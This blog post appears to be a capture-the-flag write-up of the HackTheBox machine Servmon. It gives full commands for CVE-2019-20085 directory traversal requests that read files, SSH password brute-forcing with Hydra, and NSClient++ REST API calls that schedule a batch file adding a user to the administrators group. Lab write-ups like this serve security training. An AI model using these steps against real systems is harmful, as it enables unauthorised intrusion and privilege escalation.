---
layout: post
title: Breaking Down Servmon - Exploiting CVE-2019-20085 and Innovating Privesc with NSClient++ API
date: 15/04/2024
author: Nehal Zaman
tags: ["directory traversal", "cve-2019-20085", "nsclient++ local privilege escalation"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/servmon/banner.png)

# INTRODUCTION

Greetings! Today, we're diving into [Servmon](https://app.hackthebox.com/machines/240), a box from HackTheBox.

Our journey starts with exploiting a `directory traversal` flaw in `TVT NVMS-1000`, enabling us to snatch credentials from a user with limited privileges.

Next up, we'll tackle a `local privilege escalation` vulnerability in `NSClient++`. However, there's a twist: we lack access to the `NSClient++` web UI. Thus, our privesc adventure revolves around harnessing the `NSClient++` REST service to secure a shell as administrator.

Without further ado, let's embark on our exploration.

# SCANNING

We used `rustscan` to find out which ports were open on the box: `21` (**FTP**), `22` (**SSH**), `80` (**HTTP**), `135` (**MSRPC**), `139` (**NetBIOS-SSN**), and `445` (**Microsoft-DS**).

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ rustscan -a 10.10.10.184 --ulimit 5000 | tee -a scan/rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.184:21
Open 10.10.10.184:22
Open 10.10.10.184:80
Open 10.10.10.184:135
Open 10.10.10.184:139
Open 10.10.10.184:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 11:35 EDT
Initiating Ping Scan at 11:35
Scanning 10.10.10.184 [2 ports]
Completed Ping Scan at 11:35, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:35
Completed Parallel DNS resolution of 1 host. at 11:35, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:35
Scanning 10.10.10.184 [6 ports]
Discovered open port 22/tcp on 10.10.10.184
Discovered open port 135/tcp on 10.10.10.184
Discovered open port 445/tcp on 10.10.10.184
Discovered open port 21/tcp on 10.10.10.184
Discovered open port 139/tcp on 10.10.10.184
Discovered open port 80/tcp on 10.10.10.184
Completed Connect Scan at 11:35, 0.52s elapsed (6 total ports)
Nmap scan report for 10.10.10.184
Host is up, received syn-ack (0.40s latency).
Scanned at 2024-04-13 11:35:42 EDT for 1s

PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
135/tcp open  msrpc        syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
```

Then, we ran `nmap` to learn more about the services and versions running on these ports.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ nmap -sC -sV -p21,22,80,135,139,445 10.10.10.184 -oN scan/nmap.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 11:36 EDT
Nmap scan report for 10.10.10.184
Host is up (0.42s latency).

PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp  open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp  open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=4/13%Time=661AA69F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\
SF:r\n\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20
SF:text/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo
SF::\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x
SF:20XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml
SF:1/DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w
SF:3\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x
SF:20\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n
SF:\x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\
SF:n")%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/
SF:html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20
SF:\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHT
SF:ML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD
SF:/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.or
SF:g/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x2
SF:0\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\
SF:x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r
SF:(RTSPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\
SF:r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x2
SF:01\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtm
SF:l1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/199
SF:9/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20
SF:\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x
SF:20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-13T15:39:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.23 seconds
```

# ENUMERATING RPC AND SMB

When we tried to access both `RPC` and `SMB` services, we found out that they didn't allow access without valid credentials. We attempted to connect without providing any credentials, but we were met with authentication errors.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ rpcclient -U="" 10.10.10.184
Password for [WORKGROUP\]:
Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE
```

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ smbclient -L \\\\10.10.10.184
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

In simpler terms, we couldn't get in without the right credentials.

# ENUMERATING FTP

We discovered that the `FTP` service allowed `anonymous` login, meaning we could access it without providing any specific credentials.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ ftp 10.10.10.184       
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

While exploring, we stumbled upon a file named `Confidential.txt` within the `Users/Nadine` directory.

```
ftp> ls
02-28-22  07:35PM       <DIR>          Users
ftp> cd Users
ftp> ls
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
ftp> cd Nadine
ftp> ls
02-28-22  07:36PM                  168 Confidential.txt
```

The contents of `Confidential.txt` hinted that there might be a file named `Passwords.txt` on Nathan's desktop.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ cat Confidential.txt                                                             
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards
```

Furthermore, we found another file named `Notes to do.txt` within the `Users/Nathan` directory, revealing some important tasks that had been completed.

```
ftp> ls
02-28-22  07:36PM                  182 Notes to do.txt
```

These notes highlighted that the default password for `NVMS` had been changed and that access to `NSClient` had been restricted.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ cat "Notes to do.txt" 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ 
```

# ENUMERATING WEB

When we visited the website, we were greeted with the login page for `TVT NVMS-1000`.

![](/assets/images/writeups/servmon/1.png)

`NVMS-1000` is a software used for network video surveillance.

Since we knew from our `FTP` exploration that default credentials wouldn't work, we searched for any known vulnerabilities. We stumbled upon a `directory traversal` vulnerability known as `CVE-2019-20085`, which allows remote attackers to access sensitive files on the server.

We confirmed that this instance of `TVT NVMS-1000` was vulnerable to `directory traversal` by testing a sample exploit:

```
GET /../../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 200 OK
Content-type: 
Content-Length: 92
Connection: close
AuthInfo: 

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

This request returned contents of `windows/win.ini` from the server, confirming the presence of the vulnerability.

# LOW PRIVILEGED SHELL

We wanted to access the contents of the `Passwords.txt` file located on `Nathan`'s desktop, as we learned from our `FTP` exploration.

```
GET /../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

This request returned a list of passwords, which we then tried using `Hydra` to see if any were reused by `Nadine` or `Nathan`. Fortunately, we found a match for `Nadine`.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ hydra -l nadine -P pwds.txt 10.10.10.184 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-13 12:09:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-13 12:09:17
```

With the password `L1k3B1gBut7s@W0rk`, we successfully logged in to the `SSH` service as `Nadine`.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/servmon]
└─$ ssh nadine@10.10.10.184                 
The authenticity of host '10.10.10.184 (10.10.10.184)' can't be established.
ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.184' (ED25519) to the list of known hosts.
nadine@10.10.10.184's password: 

Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

This gave us a low-privileged shell on the system.

In simpler terms, we managed to access `Nadine`'s account using one of the passwords we found, granting us limited access to the system.

# PRIVILEGE ESCALATION

We spotted the `NSClient++` folder inside `C:\Program Files`, indicating that `NSClient++` might be running on the system.

```
nadine@SERVMON C:\Program Files>dir 
 Volume in drive C has no label.                                                   
 Volume Serial Number is 20C1-47A1                                                 
                                                                                   
 Directory of C:\Program Files                                                     
                                                                                   
02/28/2022  07:55 PM    <DIR>          .                                           
02/28/2022  07:55 PM    <DIR>          ..                                          
03/01/2022  02:20 AM    <DIR>          Common Files                                
11/11/2019  07:52 PM    <DIR>          internet explorer                           
02/28/2022  07:07 PM    <DIR>          MSBuild                                     
02/28/2022  07:55 PM    <DIR>          NSClient++                                  
02/28/2022  07:46 PM    <DIR>          NVMS-1000                                   
02/28/2022  07:32 PM    <DIR>          OpenSSH-Win64                               
02/28/2022  07:07 PM    <DIR>          Reference Assemblies                        
02/28/2022  06:44 PM    <DIR>          VMware                                      
11/11/2019  07:52 PM    <DIR>          Windows Defender                            
11/11/2019  07:52 PM    <DIR>          Windows Defender Advanced Threat Protection 
09/15/2018  12:19 AM    <DIR>          Windows Mail                                
11/11/2019  07:52 PM    <DIR>          Windows Media Player                        
09/15/2018  12:19 AM    <DIR>          Windows Multimedia Platform                 
09/15/2018  12:28 AM    <DIR>          windows nt               
11/11/2019  07:52 PM    <DIR>          Windows Photo Viewer     
09/15/2018  12:19 AM    <DIR>          Windows Portable Devices 
09/15/2018  12:19 AM    <DIR>          Windows Security         
02/28/2022  07:25 PM    <DIR>          WindowsPowerShell        
               0 File(s)              0 bytes                   
              20 Dir(s)   6,100,881,408 bytes free              
                                                                
nadine@SERVMON C:\Program Files>               
```

`NSClient++` is a monitoring agent/daemon for Windows systems that works with `Nagios`. 

Although we couldn't find port `12489` open, which is usually used by `NSClient++`, we noticed that port `8443` was listening, serving as the REST API service for `NSClient++`.

```
nadine@SERVMON c:\Program Files\NSClient++>netstat -ano
 
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2196
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2276
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       6132
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:6063           0.0.0.0:0              LISTENING       6132
  TCP    0.0.0.0:6699           0.0.0.0:0              LISTENING       6132
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       496
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1372
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2164
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2060
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       636
  TCP    10.10.10.184:22        10.10.16.17:41728      ESTABLISHED     2276
  TCP    10.10.10.184:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:49673        127.0.0.1:49674        ESTABLISHED     6132
  TCP    127.0.0.1:49674        127.0.0.1:49673        ESTABLISHED     6132
  TCP    127.0.0.1:49675        127.0.0.1:49676        ESTABLISHED     6132
  TCP    127.0.0.1:49676        127.0.0.1:49675        ESTABLISHED     6132
  TCP    [::]:21                [::]:0                 LISTENING       2196
  TCP    [::]:22                [::]:0                 LISTENING       2276
  TCP    [::]:135               [::]:0                 LISTENING       864
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5666              [::]:0                 LISTENING       2228
  TCP    [::]:49664             [::]:0                 LISTENING       484
  TCP    [::]:49665             [::]:0                 LISTENING       496
  TCP    [::]:49666             [::]:0                 LISTENING       1372
  TCP    [::]:49667             [::]:0                 LISTENING       2164
  TCP    [::]:49668             [::]:0                 LISTENING       624
  TCP    [::]:49669             [::]:0                 LISTENING       2060
  TCP    [::]:49670             [::]:0                 LISTENING       636
  UDP    0.0.0.0:123            *:*                                    2404
  UDP    0.0.0.0:500            *:*                                    1768
  UDP    0.0.0.0:4500           *:*                                    1768
  UDP    0.0.0.0:5353           *:*                                    1332
  UDP    0.0.0.0:5355           *:*                                    1332
  UDP    0.0.0.0:23456          *:*                                    6132
  UDP    0.0.0.0:23456          *:*                                    6132
  UDP    0.0.0.0:34455          *:*                                    6132
  UDP    0.0.0.0:60770          *:*                                    2228
  UDP    0.0.0.0:60771          *:*                                    6132
  UDP    10.10.10.184:137       *:*                                    4
  UDP    10.10.10.184:138       *:*                                    4
  UDP    127.0.0.1:56303        *:*                                    2556
  UDP    127.0.0.1:60769        *:*                                    2228
  UDP    [::]:123               *:*                                    2404
  UDP    [::]:500               *:*                                    1768
  UDP    [::]:4500              *:*                                    1768
  UDP    [::]:5353              *:*                                    1332
  UDP    [::]:5355              *:*                                    1332
 
```

After some research, we found a `local privilege escalation` vulnerability in `NSClient++`. Learn about it [here](https://www.exploit-db.com/exploits/46802).

When `NSClient++` is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.

We easily retrieved the admin password from the configuration file:

```
nadine@SERVMON c:\Program Files>more "c:\program files\nsclient++\nsclient.ini"
ï»¿# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT
 
; Undocumented key
allowed hosts = 127.0.0.1
 
 
; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3

; Undocumented key
verify mode = peer-cert

; Undocumented key
insecure = false


; in flight - TODO
[/modules]

; Undocumented key
CheckHelpers = disabled

; Undocumented key
CheckEventLog = disabled

; Undocumented key
CheckNSCP = disabled

; Undocumented key
CheckDisk = disabled

; Undocumented key
CheckSystem = disabled

; Undocumented key
WEBServer = enabled

; Undocumented key
NRPEServer = enabled

; CheckTaskSched - Check status of your scheduled jobs.
CheckTaskSched = enabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% w
ill be replaced by any given arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
[/settings/external scripts/scripts]


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true
```

Alternatively, we could use the command:

```
nadine@SERVMON c:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

Here comes the twist. Even though we couldn't access the Web UI of `NSClient++`, as `Nathan` restricted it based on our `FTP` enumeration, we still had access to the `NSClient++` REST API service. We had to dig into the `NSClient++` REST API [documentation](https://nsclient.org/docs/api/rest/) to find the appropriate API call for exploitation.

First, we ensured that we could access the REST API using the admin password:

```
nadine@SERVMON c:\Program Files\NSClient++>curl -k -i -u admin https://localhost:8443/api/v1/scripts/ext?all=true
Enter host password for user 'admin': ew2x6SsGTxjRwXOT
HTTP/1.1 200
Content-Length: 1361
Set-cookie: token=frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ; path=/
Set-cookie: uid=admin; path=/

["scripts\\check_60s.bat","scripts\\check_battery.vbs","scripts\\check_files.vbs","scripts\\check_long.bat","scripts\\check_no_rdp.bat","scripts\\check_ok.bat","scripts\\check_ok.sh","scripts\\check_ping.bat","scripts\\check_printer.vbs
","scripts\\check_test.bat","scripts\\check_test.ps1","scripts\\check_test.sh","scripts\\check_test.vbs","scripts\\check_updates.vbs","scripts\\custom\\my_custom_script.bat","scripts\\lua\\check_cpu_ex.lua","scripts\\lua\\default_check_
mk.lua","scripts\\lua\\noperf.lua","scripts\\lua\\test.lua","scripts\\lua\\test_ext_script.lua","scripts\\lua\\test_nrpe.lua","scripts\\powershell.ps1","scripts\\python\\badapp.py","scripts\\python\\docs.py","scripts\\python\\sample\\li
st_all_wmi_objects.py","scripts\\python\\sample.py","scripts\\python\\test.py","scripts\\python\\test_all.py","scripts\\python\\test_eventlog.py","scripts\\python\\test_external_script.py","scripts\\python\\test_log_file.py","scripts\\p
ython\\test_nrpe.py","scripts\\python\\test_nsca.py","scripts\\python\\test_nscp.py","scripts\\python\\test_pb.py","scripts\\python\\test_python.py","scripts\\python\\test_sample.py","scripts\\python\\test_stress.py","scripts\\python\\t
est_w32_file.py","scripts\\python\\test_w32_schetask.py","scripts\\python\\test_w32_system.py","scripts\\python\\test_w32_wmi.py","scripts\\python\\__init__.py","scripts\\test.lua"]
nadine@SERVMON c:\Program Files\NSClient++>
```

Then, we loaded the `CheckExternalScripts` and `Scheduler` modules using the REST API, enabling us to run external scripts:

```
nadine@SERVMON c:\Program Files\NSClient++>curl -s -k -u admin https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/load
Enter host password for user 'admin':
Success load CheckExternalScripts
```

```
nadine@SERVMON c:\Program Files\NSClient++>curl -s -k -u admin https://localhost:8443/api/v1/modules/Scheduler/commands/load
Enter host password for user 'admin':
Success load Scheduler
```

After confirming that the modules were correctly loaded, we created an `evil.bat` file that would add `Nadine` to the `Administrator` group.

```
nadine@SERVMON c:\Program Files\NSClient++>curl -s -k -u admin https://localhost:8443/api/v1/modules/CheckExternalScripts
Enter host password for user 'admin':
{"description":"Module used to execute external scripts","id":"CheckExternalScripts","load_url":"https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/load","loaded":true,"metadata":{"alias":"","plugin_id":"0"},"name":"Che
ckExternalScripts","title":"CheckExternalScripts","unload_url":"https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/unload"}
nadine@SERVMON c:\Program Files\NSClient++>

nadine@SERVMON c:\Program Files\NSClient++>curl -s -k -u admin https://localhost:8443/api/v1/modules/Scheduler
Enter host password for user 'admin':
{"description":"Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA","id":"Scheduler","load_url":"https://localhost:8443/api/v1/modules/Scheduler/commands/load","loaded":true,"me
tadata":{"alias":"","plugin_id":"3"},"name":"Scheduler","title":"Scheduler","unload_url":"https://localhost:8443/api/v1/modules/Scheduler/commands/unload"}
nadine@SERVMON c:\Program Files\NSClient++>
```

```
@echo off
net localgroup administrators nadine /add
```

Then, we added the `evil.bat` script in `NSClient++` using the REST API:

```
nadine@SERVMON C:\Users\Nadine\Documents>curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @evil.bat
Enter host password for user 'admin':
Added check_new as scripts\check_new.bat
```

Finally, we scheduled our script to run in 1 minute:

```
nadine@SERVMON C:\Program Files\NSClient++\modules>curl -s -k -u admin "https://localhost:8443/api/v1/queries/check_new/commands/execute_nagios?time=1m"
Enter host password for user 'admin':
{"command":"check_new","lines":[{"message":"The command completed successfully.","perf":""}],"result":"OK"}
nadine@SERVMON C:\Program Files\NSClient++\modules>
```

Upon execution, `Nadine` was successfully added to the `Administrator` group, granting us elevated privileges.

```
nadine@SERVMON C:\Program Files\NSClient++\modules>net user nadine
User name                    Nadine
Full Name                    Nadine
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/28/2022 7:33:50 PM
Password expires             Never
Password changeable          2/28/2022 7:33:50 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/13/2024 8:45:02 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.


nadine@SERVMON C:\Program Files\NSClient++\modules>
```

And there it was, the root flag, ready to be captured.

```
nadine@SERVMON C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 20C1-47A1

 Directory of C:\Users\Administrator\Desktop

02/28/2022  07:56 PM    <DIR>          .
02/28/2022  07:56 PM    <DIR>          ..
04/13/2024  08:32 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,101,196,800 bytes free

nadine@SERVMON C:\Users\Administrator\Desktop>
```

# CONCLUSION

In summary, we began by exploiting a `directory traversal` flaw in `TVT NVMS-1000`, leading to the discovery of credentials for a user with limited privileges. 

Next, we escalated our privileges by exploiting a `local privilege escalation` vulnerability in `NSClient++`. Despite lacking access to the `NSClient++` Web UI, essential for exploitation, we utilized the `NSClient++` REST API to execute actions equivalent to those in the Web UI. This enabled us to elevate the low-privileged user to the `administrator` group, granting full `administrator` access.

That concludes our exploration of this box. Thanks for following along, and I look forward to the next challenge!